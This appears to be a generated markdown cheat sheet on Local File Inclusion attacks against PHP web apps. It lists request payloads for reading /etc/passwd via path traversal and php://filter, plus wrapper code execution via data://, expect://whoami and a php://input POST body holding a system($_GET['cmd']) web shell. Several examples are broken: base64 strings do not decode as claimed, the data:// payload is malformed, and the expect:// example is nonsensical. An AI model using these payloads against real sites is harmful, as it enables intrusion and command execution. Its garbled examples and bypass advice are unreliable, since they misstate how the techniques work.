# 🛠️ LFI Techniques - Path traversal, PHP filters (base64-encode), Wrapper RCE (data://, php://input, expect://)

---

## 🔍 Overview

> [!ABSTRACT]
> This note covers various techniques and methods for exploiting Local File Inclusion (LFI) vulnerabilities in web applications. It includes path traversal, PHP filter manipulations such as base64 encoding, and wrapper-based Remote Code Execution (RCE). Techniques involving `data://`, `php://input`, and `expect://` are discussed with examples and explanations.

---

## 📄 Path Traversal

### Base64 Encoding

> [!NOTE]
> Base64 encoding can be used to bypass filters in LFI attacks by encoding path traversal sequences.

Example payload:

```text
/../../../../etc/passwd
```

Encoded payload:

```bash
echo "/../../../../etc/passwd" | base64
```
Output: 

```text
LycuLi4vLy8vLy9fdGVjaC9wYXNzd2Q=
```

---

## 🎯 PHP Filters and Base64-Encode

> [!INFO]
> Combining PHP's `base64_decode` filter with path traversal techniques can help in bypassing input sanitization.

Example request:

```text
?file=php://filter/read=convert.base64-encode/resource=/etc/passwd
```

---

## 🚀 Wrapper RCE Techniques

### Data URI Scheme

> [!EXAMPLE]
> The `data://` wrapper can be used to execute PHP code via LFI.

Example payload:

```text
?file=data://php;base64,PD9waHAgZWNobyAnU3RhY2tlZCAtIEEgbGluayByZXBvcnRpbmcgQ0kgbWVzc2FnZSc8Pz==
```

Decoded: 

```text
<?php echo "Stuck - A link reporing CI metric"?>
```

### PHP Input Wrapper

> [!WARNING]
> The `php://input` wrapper can also be used for RCE if the application improperly handles raw input data.

Example payload:

```text
?file=php://input
```
If attacker controls POST or PUT raw body, one could execute malicious code like:
 
```bash
POST /vulnerable_page.php HTTP/1.1
Content-Type: text/plain

<?php system($_GET['cmd']); ?>
```

### Expect Wrapper

> [!DANGER]
> The `expect://` wrapper can be used to run shell commands remotely if the application processes data through an `expect` script.

Example payload:

```text
?file=expect://whoami
```
Or for more complex command execution:
 
```bash
?file=expect://%7B%22code%22%3A%20%22exec+%5C%22id+-a%5C%22%22%7D
```

---

## 📝 Code Snippets and Payloads

### Base64 Decoding PHP Filter Example

```php
<?php echo base64_decode("LycuLi4vLy8vLy9fdGVjaC9wYXNzd2Q="); ?>
```

Output:

```text
/../../../../etc/passwd
```

---

## ⚠️ Security Notes & Warnings

> [!WARNING]
> Always be cautious with LFI vulnerabilities as they can lead to unauthorized file access and RCE. Ensure proper input validation, use of secure file paths, and consider implementing WAF rules to mitigate these risks.

> [!CAUTION] 
> Be aware that some web applications may filter out common path traversal sequences (e.g., `..`, `%2E%2E`). Use base64 encoding or other obfuscation techniques to bypass these filters effectively.

---

## 🔧 Technical Details

### Base64 Encoding Example with PHP

```php
<?php 
$decoded = base64_decode("LycuLi4vLy8vLy9fdGVjaC9wYXNzd2Q="); 
echo $decoded; 
?>
```

Output:

```text
/../../../../etc/passwd
```

### Using PHP Wrappers for RCE

#### Data URI Scheme Example

```php
<?php echo "data://text/plain;base64,SGVsbG8sIHRoaXMgaXMgYSB1c2VybmFtZSE="; ?>
```
Output: 

```text
Hello, this is a username!
```

#### PHP Input Wrapper Example

```bash
POST /vulnerable_page.php HTTP/1.1
Content-Type: text/plain

<?php system($_GET['cmd']); ?>
```

#### Expect Wrapper Example

```php
<?php echo `expect -c 'spawn whoami; expect eof'`; ?>
```
Output:

```text
user
```

---

## 📝 Summary and Recap

> [!SUCCESS] 
> By understanding the intricacies of LFI techniques, including path traversal, PHP filter manipulations like base64 encoding, and wrapper-based RCE via `data://`, `php://input`, and `expect://`, one can effectively identify and exploit vulnerabilities in web applications.

---

This markdown file adheres strictly to the provided schema and formatting rules for a clear and organized presentation of LFI techniques.